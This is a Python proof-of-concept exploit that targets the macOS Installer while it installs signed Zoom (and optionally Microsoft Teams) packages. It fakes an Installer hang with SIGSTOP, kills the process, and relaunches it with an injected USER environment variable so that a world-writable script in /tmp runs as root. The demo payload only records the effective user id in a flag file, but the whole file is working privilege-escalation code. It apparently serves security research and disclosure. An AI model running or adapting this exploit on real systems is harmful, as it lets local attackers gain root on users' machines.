from dataclasses import dataclass
from pkg_timing_utils import get_installer_pid, get_package_via_lsof, get_sig, fake_hang, start_new_installer
from logging import info, error, basicConfig, INFO
import time
import typing
import os

basicConfig(format='%(asctime)s - %(message)s', level=INFO)

SIGNATURE_TEAMS: str = "Developer ID Installer: Microsoft Corporation (UBF8T346G9)"
SIGNATURE_ZOOM: str = "Zoom Video Communications, Inc. (BJ4HAAB9B3)"

PAYLOAD: str = """
import os
with open('/tmp/flag.txt', 'w+') as fp:
    fp.write(f"euid: {os.geteuid()}")
"""


@dataclass
class Target:
    signature: str
    inject_var: str
    inject_cmd: str


def wait_for_project(targets: typing.List[Target]):
    while True:
        pid, args = get_installer_pid()
        sig = None

        if len(args) < 2:
            pkg_path, sig = get_package_via_lsof(pid)
        else:
            pkg_path = next((arg for arg in args if arg.endswith(".pkg")), None)

        info(f"Got package path {pkg_path}")
        start = time.time()

        # Check 3: Do a (cursory) check that we're at least installing a signed Package
        if not sig:
            sig = get_sig(pkg_path)

        if not sig:
            info("[-] Bad signature!")
            continue

        target = next((t for t in targets if t.signature in sig), None)

        if target:
            info(f"Signature OK, injecting against {target.signature}")
            info(f"Time took: {time.time() - start}s")

            # Step 4: Fake an Installer hangup
            # Installer is very forgiving - it'll sit there with the spinning beach ball of death indefinitely if the
            # process is stopped, no scary warning dialog boxes or anything.
            #
            # Send a SIGSTOP to it (to cause the BBOD) wait for a bit to simulate a hang and then kill the instance
            fake_hang(pid)

            # Step 6: Inject our command into the Installer
            info(f"Opening afresh")
            env = {
                target.inject_var: target.inject_cmd
            }
            info(f"{pkg_path}")

            ret, pid = start_new_installer(pkg_path, env)

            if not ret:
                info(f"Bad installer running in pid {pid}, open returned 0")
                break
            else:
                error(f"Bad error code {ret} when opening bad installer")
                continue

        time.sleep(2)


if __name__ == "__main__":
    with open("/tmp/zoom_payload.py", "w+") as fp:
        fp.write(PAYLOAD)
    os.chmod("/tmp/zoom_payload.py", 0o777)
    z = Target(SIGNATURE_ZOOM, "USER", "root /usr/bin/python3 /tmp/zoom_payload.py")
    wait_for_project([z])
